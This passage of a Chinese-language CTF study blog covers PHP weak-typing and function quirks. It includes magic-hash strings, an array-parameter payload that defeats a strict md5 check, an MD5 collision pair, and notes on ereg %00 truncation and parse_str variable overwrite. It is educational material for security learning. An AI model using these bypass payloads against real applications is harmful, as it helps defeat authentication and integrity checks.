class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">240610708</span> <br><span class="hljs-number">0</span>e4620974319065090195<span class="hljs-number">62988736854</span><br> <br><span class="hljs-number">314282422</span> <br><span class="hljs-number">0</span>e9909955048216994945<span class="hljs-number">20356953734</span><br> <br><span class="hljs-number">571579406</span> <br><span class="hljs-number">0</span>e972379832854295224<span class="hljs-number">118025748221</span><br><br>QLTHNDT <br><span class="hljs-number">0</span>e40596782540195537<span class="hljs-number">2549139051580</span><br> <br>QNKCDZO <br><span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br> <br>EEIZDOI <br><span class="hljs-number">0</span>e78260136353929177<span class="hljs-number">9881938479162</span><br> <br>TUFEPMC <br><span class="hljs-number">0</span>e839407194569345277<span class="hljs-number">863905212547</span><br> <br>UTIPEZQ <br><span class="hljs-number">0</span>e3820987882312349546<span class="hljs-number">70291303879</span><br></code></pre></td></tr></table></figure><hr><h4 id="md5强类型比较"><a href="#md5强类型比较" class="headerlink" title="md5强类型比较"></a>md5强类型比较</h4><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> != <span class="hljs-variable">$password</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$username</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;GET_FLAG：&#x27;</span>.<span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;md5校验出错...&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户名密码不能相等！&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> 用户名密码不能相等！<br><br></code></pre></td></tr></table></figure><p>全等运算符“&#x3D;&#x3D;&#x3D;”，既比较值又比较类型，题目中“!&#x3D;”意思为“不等于”，具体可查看菜鸟教程关于“!&#x3D;”说明，值不相等时返回“ture”，也就是说两个参数值要不相等，两个参数在md5加密后全相等，也就是说两个参数在md5加密后不仅值相等类型也要一致，此时就无法利用PHP 0e漏洞了，需要别的方法绕过。可以利用md5在加密字符串时会warining，输出结果为NULL，传入两个数组，这样就能使两个参数在md5加密后的类型是一致的。</p><p>payload:?username[]&#x3D;1&amp;password[]&#x3D;2</p><h4 id="md5强碰撞（绕过强类型比较）"><a href="#md5强碰撞（绕过强类型比较）" class="headerlink" title="md5强碰撞（绕过强类型比较）"></a>md5强碰撞（绕过强类型比较）</h4><p>两个字符串不同，但是md5加密后的值相同，这就是md5碰撞，可以通过工具生成，这里有两个例子，可以用来绕过强类型比较</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1U</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span><br>&amp;b<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span><br><br>a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br>&amp;b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure><h4 id="算数运算配合自动类型转换"><a href="#算数运算配合自动类型转换" class="headerlink" title="算数运算配合自动类型转换"></a>算数运算配合自动类型转换</h4><p>md5()遇到算数符时，会先运算，再计算结果的md5值</p><p>所以，当字符串与数字类型运算时，会将字符串转换成数字类型再参与运算，最后计算运算结果的MD5值</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> md5<span class="hljs-params">(3)</span><span class="hljs-string">.PHP_EOL</span>;<br><span class="hljs-keyword">echo</span> md5<span class="hljs-params">(&#x27;2&#x27; + 1)</span><span class="hljs-string">.PHP_EOL</span>;<br><br><span class="hljs-comment">#eccbc87e4b5ce2fe28308fd9f2a7baf3</span><br><span class="hljs-comment">#eccbc87e4b5ce2fe28308fd9f2a7baf3</span><br></code></pre></td></tr></table></figure><hr><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p><strong>&amp;符号的利用</strong></p><p>感觉有点像c里的取地址符，指针</p><p>比如：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>var <span class="hljs-variable">$enter</span>;<br>var <span class="hljs-variable">$secret</span>;<br>&#125;<br><br><br><span class="hljs-variable">$a</span> = new test();<br><span class="hljs-variable">$a</span>-&gt;enter = &amp;<span class="hljs-variable">$a</span>-&gt;secret;<br></code></pre></td></tr></table></figure><p>这里就相当于a对象中的成员属性enter的值引用了a对象中成员属性secret的值，所以当secret的值改变的时候，enter依然与enter相同</p><hr><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><p><a href="https://www.php.net/manual/zh/function.in-array.php">in_array()用法</a></p><p>in_array()函数搜索数组中是否存在指定的值。</p><p>语法：<code>in_array(search,array,type)</code></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">参数描述<br>search必需。规定要在数组搜索的值<span class="hljs-built_in"></span><br><span class="hljs-built_in">array</span>必需。规定要搜索的数组<br>type可选，如果设置该参数为true，则检查搜索的数据与数组的值的类型是否相同<br></code></pre></td></tr></table></figure><p><strong>type ： 类型，true全等 ，false非全等（默认）</strong></p><hr><h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h3><p><a href="https://www.php.net/manual/zh/function.file-put-contents.php">file_put_contents()用法</a></p><ul><li>该函数访问文件时，遵循以下规则：</li><li>如果设置了 FILE_USE_INCLUDE_PATH，那么将检查 filename 副本的内置路径</li><li>如果文件不存在，将创建一个文件</li><li>打开文件</li><li>如果设置了 LOCK_EX，那么将锁定文件</li><li>如果设置了 FILE_APPEND，那么将移至文件末尾。否则，将会清除文件的内容</li><li>向文件中写入数据</li><li></li><li>关闭文件并对所有文件解锁</li><li>如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">file_put_contents</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$data</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-number">0</span> [, resource <span class="hljs-variable">$context</span> ]] )<br><br>filename： 必需。规定要写入数据的文件。 如果文件不存在，则创建一个新文件。<br>data： 必需。规定要写入文件的数据。可以是字符串、数组或数据流。<br></code></pre></td></tr></table></figure><hr><h3 id="逻辑运算符优先级"><a href="#逻辑运算符优先级" class="headerlink" title="逻辑运算符优先级"></a>逻辑运算符优先级</h3><p><a href="https://www.runoob.com/php/php-operators.html">逻辑运算符详解</a></p><p>“&amp;&amp;” &gt; “||” &gt; “&#x3D;” &gt; “and”</p><hr><h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h3><p><a href="https://www.php.net/manual/zh/function.is-numeric.php">is_numeric函数详解</a></p><p>用于检测变量是否为数字或数字字符串。<br> 如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">is_numeric</span><span class="hljs-params">(mixed <span class="hljs-variable">$value</span>)</span></span>: bool<br></code></pre></td></tr></table></figure><p>参数</p><ul><li><code>value</code> 需要检测的变量。</li></ul><p>返回值</p><ul><li>如果 <code>value</code> 是数字或数字字符串，    返回 **<code>true</code>**，否则返回 **<code>false</code>**。</li></ul><hr><h3 id="ReflectionClass反射类"><a href="#ReflectionClass反射类" class="headerlink" title="ReflectionClass反射类"></a>ReflectionClass反射类</h3><p><strong>PHP Reflection API是PHP5才有的新功能，它是用来导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。</strong></p><p>反射类可以说成是类的一个映射，可以利用反射类来代替有关类的应用的任何语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;flag&#123;123123123&#125;&quot;</span>;<br><span class="hljs-keyword">const</span>  PI=<span class="hljs-number">3.14</span>;<br><span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&lt;/br&gt;&quot;</span>;<br>&#125;<br>&#125;<br><br>/有这么一个A类，假设我们不知道这个类是干什么用的，我们需要知道类里面的信息，这时候就需要用到ReflectionClass来对类进行反射<br><span class="hljs-comment">//现在我可以通过反射来获取这个类中的方法，属性，常量</span><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-string">&#x27;A&#x27;</span>);<span class="hljs-comment">//实例化反射对象,映射A类的信息</span><br><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getConstants</span>());  获取一组常量<br>输出<br> <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-string">&quot;PI&quot;</span>]=&gt;<br>  <span class="hljs-keyword">float</span>(<span class="hljs-number">3.14</span>)<br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getName</span>());    获取类名<br>输出<br><span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;A&quot;</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getStaticProperties</span>()); 获取静态属性<br>输出<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-string">&quot;flag&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">15</span>) <span class="hljs-string">&quot;flag&#123;123123123&#125;&quot;</span><br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getMethods</span>()); 获取类中的方法<br>输出<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">object</span>(ReflectionMethod)<span class="hljs-comment">#2 (2) &#123;</span><br>    [<span class="hljs-string">&quot;name&quot;</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;hello&quot;</span><br>    [<span class="hljs-string">&quot;class&quot;</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;A&quot;</span><br>  &#125;<br>  <br> <br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getProperties</span>());  <span class="hljs-comment">//获取所有属性</span><br><br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><p><a href="https://www.php.net/manual/zh/function.call-user-func.php">call_user_func函数具体详解</a></p><p><code>call_user_func($callback, parameter)</code>：调用函数，第一个参数为被调用的函数，第二个参数为被调用函数所需的参数；</p><p>第一个参数是必须的，第二个参数可选</p><p>call_user_func支持传入数组，且可以用数组来调用静态方法</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$ans</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-variable">$ans</span>[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$ans</span>);<br><br><span class="hljs-comment">#输出</span><br>flag<br></code></pre></td></tr></table></figure><hr><h3 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h3><p><a href="https://www.php.net/manual/zh/function.substr.php">substr函数详解</a></p><p>substr() 可以截取字符串</p><p>语法</p><pre><code>string substr( $str, start, length); $str ：被截取的字符串。 start ：开始截取的位置。 length ：截取的长度。</code></pre><p>返回值</p><p>截取成功，就返回截取的字符串<br>start 超过字符串长度，就返回 false<br>start 和 length 设置成不合理的截取范围，就返回空字符串<br>substr((xxx),1,1):表示从第1个字母开始，显示1个字母，从1开始计数</p><hr><h3 id="hex2bin"><a href="#hex2bin" class="headerlink" title="hex2bin()"></a>hex2bin()</h3><p><a href="https://www.php.net/manual/zh/function.hex2bin.php">hex2bin函数详解</a></p><p><code>hex2bin()</code>：将十六进制字符转化为ASCII码字符。</p><hr><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><a href="https://www.cnblogs.com/hithub/p/16299548.html">CTF之php伪协议以及能使用php伪协议的函数</a></p><hr><h3 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h3><p><a href="https://www.php.net/manual/zh/function.sha1.php">sha1详解</a></p><p>sha1 — 计算字符串的 sha1 散列</p><p><strong>sha1</strong>(string <code>$string</code>, bool <code>$binary</code> &#x3D; <strong><code>false</code></strong>): </p><p>以字符串形式返回 sha1 散列值。</p><p>绕过方法：不能处理数组，而且能构造出0exxxx类型数据，能绕过弱类型比较</p><hr><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>变量覆盖是把变量的值当作另一个变量的名</p><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;c&#x27;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$a&#x27;</span>;<span class="hljs-comment">#b</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$b&#x27;</span>;<span class="hljs-comment">#c</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$$a&#x27;</span> <span class="hljs-comment">#c</span><br></code></pre></td></tr></table></figure><hr><h3 id="die"><a href="#die" class="headerlink" title="die()"></a>die()</h3><p>PHP 中的 die() 函数是一个终止脚本执行的函数，它会立即结束当前正在运行的脚本，并可选地输出一条错误信息（可以输出变量）</p><p><strong>用法</strong></p><p>die() 函数的语法如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">die</span><span class="hljs-params">(message)</span></span><br></code></pre></td></tr></table></figure><p>参数 message 是一个可选的字符串，将作为错误信息在脚本终止前显示。如果没有提供错误信息，则不会显示任何内容。</p><hr><h3 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h3><p><a href="https://www.runoob.com/php/func-string-parse-str.html">parse_str函数详解</a></p><p>parse_str() 函数把查询字符串解析到变量中。</p><p><strong>注释：</strong>如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p><p><strong>注释：</strong>php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p><p>语法：</p><p>parse_str(<em>string,array</em>)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>string</em></td><td>必需。规定要解析的字符串。</td></tr><tr><td><em>array</em></td><td>可选。规定存储变量的数组名称。该参数指示变量存储到数组中。</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-string">&quot;name=Peter&amp;age=43&quot;</span>,<span class="hljs-variable">$myArray</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$myArray</span>);<br><span class="hljs-meta">?&gt;</span><br><br><br><span class="hljs-title function_ invoke__">Array</span> ( [name] =&gt; Peter [age] =&gt; <span class="hljs-number">43</span> ) <br><br>如果<span class="hljs-keyword">string</span>参数填xxx=后面没有值<br>则<span class="hljs-variable">$myArray</span>[<span class="hljs-string">&#x27;xxx&#x27;</span>]=<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><hr><h3 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h3><p><code>ereg()</code>正则匹配函数，类似<code>preg_match</code>，php7.0已删除。<code>ereg()</code>存在%00截断漏洞，也就是说在字符串中遇到%00，php解析器会认为字符串结束了。<strong>而且截断之后，%00后面的值会重新赋值给原来的变量。</strong></p><hr><h3 id="strrev"><a href="#strrev" class="headerlink" title="strrev()"></a>strrev()</h3><p>strrev() ：反转字符串</p><hr><h3 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h3><p><a href="https://blog.csdn.net/weixin_54902210/article/details/124689580">php原生类总结</a></p><hr><h3 id="toString-魔术方法"><a href="#toString-魔术方法" class="headerlink" title="__toString()魔术方法"></a>__toString()魔术方法</h3><p>将一个对象作为字符串使用时（<code>echo &lt;一个对象&gt;</code>），php会自动调用该对象的 <code>__toString()</code>方法来获取<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A1%A8%E7%A4%BA&spm=1001.2101.3001.7020">字符串表示</a>。注意，<code>__toString()</code>方法在对象被隐式转换为字符串时（<code>echo &lt;一个对象&gt;</code>）才会触发，如果直接调用该方法，不会有任何效果。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 